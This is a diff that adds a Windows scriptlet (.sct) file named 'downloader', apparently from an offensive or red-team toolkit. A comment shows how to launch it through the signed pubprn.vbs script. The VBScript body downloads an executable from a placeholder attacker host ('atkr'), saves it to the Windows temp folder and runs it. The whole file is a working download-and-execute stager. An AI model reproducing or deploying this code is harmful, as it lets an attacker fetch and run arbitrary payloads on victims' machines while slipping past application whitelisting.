@@ -1,0 +1,49 @@
+<?XML version="1.0"?>
+<scriptlet>
+
+' cscript /b C:\Windows\System32\Printing_Admin_Scripts\en-US\pubprn.vbs blah "script:http://atkr/downloader.sct"
+
+<registration
+    description="downloader"
+    progid="downloader"
+    version="1.00"
+    classid=""
+    remotable="true"
+        >
+</registration>
+
+<script language="vbscript">
+<![CDATA[
+
+    strFileURL = "http://atkr/file.exe"
+    strHDLocation = "c:\windows\temp\file.exe"
+
+
+    Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
+    objXMLHTTP.open "GET", strFileURL, false
+    objXMLHTTP.send()
+
+If objXMLHTTP.Status = 200 Then
+Set objADOStream = CreateObject("ADODB.Stream")
+objADOStream.Open
+objADOStream.Type = 1 'adTypeBinary
+
+objADOStream.Write objXMLHTTP.ResponseBody
+objADOStream.Position = 0    'Set the stream position to the start
+
+Set objFSO = Createobject("Scripting.FileSystemObject")
+If objFSO.Fileexists(strHDLocation) Then objFSO.DeleteFile strHDLocation
+Set objFSO = Nothing
+
+objADOStream.SaveToFile strHDLocation
+objADOStream.Close
+Set objADOStream = Nothing
+End if
+
+Set objXMLHTTP = Nothing
+
+Set objShell = CreateObject("WScript.Shell")
+objShell.Run strHDLocation
+]]>
+</script>
+</scriptlet>
